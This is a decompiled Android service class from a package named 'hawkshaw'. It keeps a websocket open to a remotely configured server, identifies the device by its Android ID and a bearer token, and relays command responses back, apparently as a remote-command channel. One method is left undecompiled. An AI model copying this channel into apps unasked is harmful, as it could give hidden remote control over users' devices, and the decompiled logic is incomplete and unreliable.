package com.hawkshaw.library.datalayer.network.socket;

import F3.b;
import X1.C;
import X1.C0091k;
import X1.G;
import Y1.J;
import Y1.K;
import a3.e;
import a3.j;
import android.app.Service;
import android.content.Intent;
import com.hawkshaw.library.App;
import com.hawkshaw.library.config.RemoteConfig;
import com.hawkshaw.library.datalayer.models.SocketCommandResponse;
import com.hawkshaw.library.datalayer.network.twirp.interceptors.ContentNegotiationInterceptorKt;
import com.hawkshaw.library.deviceinfo.DeviceInfo;
import com.hawkshaw.library.ktextensions.CoroutineKt;
import com.hawkshaw.library.logger.Logger;
import com.hawkshaw.library.preferences.Prefs;
import j3.f;
import java.net.URI;
import me.pushy.sdk.config.PushyAPIConfig;
import t3.N;

public final class SocketService extends Service {
    public static final Companion Companion = new Companion((f) null);
    private static final String RESPONSE_KEY = "response";
    private static final String TAG = "SocketService";
    private final G factory;
    /* access modifiers changed from: private */
    public final SocketService$listener$1 listener;
    /* access modifiers changed from: private */
    public final C socket;

    public static final class Companion {
        private Companion() {
        }

        public /* synthetic */ Companion(f fVar) {
            this();
        }

        /* JADX WARNING: Removed duplicated region for block: B:12:0x0031  */
        /* JADX WARNING: Removed duplicated region for block: B:8:0x0021  */
        /* Code decompiled incorrectly, please refer to instructions dump. */
        public final java.lang.Object connectSocket(a3.e r7) {
            /*
                r6 = this;
                boolean r0 = r7 instanceof com.hawkshaw.library.datalayer.network.socket.b
                if (r0 == 0) goto L_0x0013
                r0 = r7
                com.hawkshaw.library.datalayer.network.socket.b r0 = (com.hawkshaw.library.datalayer.network.socket.b) r0
                int r1 = r0.f4932G
                r2 = -2147483648(0xffffffff80000000, float:-0.0)
                r3 = r1 & r2
                if (r3 == 0) goto L_0x0013
                int r1 = r1 - r2
                r0.f4932G = r1
                goto L_0x0018
            L_0x0013:
                com.hawkshaw.library.datalayer.network.socket.b r0 = new com.hawkshaw.library.datalayer.network.socket.b
                r0.<init>(r6, r7)
            L_0x0018:
                java.lang.Object r7 = r0.f4930E
                b3.a r1 = b3.C0298a.f4140D
                int r2 = r0.f4932G
                r3 = 1
                if (r2 == 0) goto L_0x0031
                if (r2 != r3) goto L_0x0029
                android.content.Intent r0 = r0.f4929D
                Y1.C0110h.P(r7)
                goto L_0x0059
            L_0x0029:
                java.lang.IllegalStateException r7 = new java.lang.IllegalStateException
                java.lang.String r0 = "call to 'resume' before 'invoke' with coroutine"
                r7.<init>(r0)
                throw r7
            L_0x0031:
                Y1.C0110h.P(r7)
                android.content.Intent r7 = new android.content.Intent
                com.hawkshaw.library.App$Companion r2 = com.hawkshaw.library.App.Companion
                android.content.Context r4 = r2.getContext()
                java.lang.Class<com.hawkshaw.library.datalayer.network.socket.SocketService> r5 = com.hawkshaw.library.datalayer.network.socket.SocketService.class
                r7.<init>(r4, r5)
                android.content.Context r2 = r2.getContext()
                r2.stopService(r7)
                r0.getClass()
                r0.f4929D = r7
                r0.f4932G = r3
                r2 = 1000(0x3e8, double:4.94E-321)
                java.lang.Object r0 = Y1.K.C(r2, r0)
                if (r0 != r1) goto L_0x0058
                return r1
            L_0x0058:
                r0 = r7
            L_0x0059:
                com.hawkshaw.library.App$Companion r7 = com.hawkshaw.library.App.Companion
                android.content.Context r7 = r7.getContext()
                r7.startService(r0)
                W2.y r7 = W2.y.f2418a
                return r7
            */
            throw new UnsupportedOperationException("Method not decompiled: com.hawkshaw.library.datalayer.network.socket.SocketService.Companion.connectSocket(a3.e):java.lang.Object");
        }

        public final void disconnectSocket() {
            App.Companion companion = App.Companion;
            companion.getContext().startService(new Intent(companion.getContext(), SocketService.class));
        }

        public final void sendResponse(SocketCommandResponse socketCommandResponse) {
            K.n(socketCommandResponse, SocketService.RESPONSE_KEY);
            App.Companion companion = App.Companion;
            Intent intent = new Intent(companion.getContext(), SocketService.class);
            b json = ContentNegotiationInterceptorKt.getJson();
            json.getClass();
            String b5 = json.b(SocketCommandResponse.Companion.serializer(), socketCommandResponse);
            Logger.v$default(Logger.INSTANCE, SocketService.TAG, "Response: ".concat(b5), false, 4, (Object) null);
            intent.putExtra(SocketService.RESPONSE_KEY, b5);
            companion.getContext().startService(intent);
        }
    }

    public SocketService() {
        G g5 = new G();
        g5.f2464c = PushyAPIConfig.TIMEOUT;
        this.factory = g5;
        String websocketUri = RemoteConfig.INSTANCE.getWebsocketUri();
        int i5 = g5.f2464c;
        if (websocketUri == null) {
            throw new IllegalArgumentException("The given URI is null.");
        } else if (i5 >= 0) {
            this.socket = g5.a(URI.create(websocketUri), i5);
            this.listener = new SocketService$listener$1(this);
        } else {
            throw new IllegalArgumentException("The given timeout value is negative.");
        }
    }

    /* access modifiers changed from: private */
    public final void connect(C c5, long j5) {
        CoroutineKt.safeLaunch$default(J.a(N.f9292c), (j) null, new c(j5, this, c5, (e) null), 1, (Object) null);
    }

    public static /* synthetic */ void connect$default(SocketService socketService, C c5, long j5, int i5, Object obj) {
        if ((i5 & 2) != 0) {
            j5 = 1000;
        }
        socketService.connect(c5, j5);
    }

    /* JADX WARNING: type inference failed for: r1v1, types: [java.lang.Object, X1.H] */
    private final void sendTextMessage(String str) {
        if (!this.socket.g(X1.K.f2474F)) {
            connect(this.socket.h(), 5000);
        }
        C c5 = this.socket;
        c5.getClass();
        ? obj = new Object();
        obj.f2465a = true;
        obj.f2469e = 1;
        if (str == null || str.length() == 0) {
            obj.b((byte[]) null);
        } else {
            obj.b(C0091k.a(str));
        }
        c5.j(obj);
    }

    /* access modifiers changed from: private */
    public final C setHeaders(C c5) {
        String token = Prefs.INSTANCE.getToken();
        c5.a("Authorization", "Bearer " + token);
        c5.a("App-Id", DeviceInfo.INSTANCE.getAndroidId());
        c5.f2438f.a(10000);
        return c5;
    }

    public Void onBind(Intent intent) {
        return null;
    }

    public void onCreate() {
        super.onCreate();
        C c5 = this.socket;
        K.m(c5, "socket");
        connect$default(this, c5, 0, 2, (Object) null);
    }

    public int onStartCommand(Intent intent, int i5, int i6) {
        String stringExtra;
        if (!(intent == null || (stringExtra = intent.getStringExtra(RESPONSE_KEY)) == null)) {
            sendTextMessage(stringExtra);
        }
        return super.onStartCommand(intent, i5, i6);
    }
}
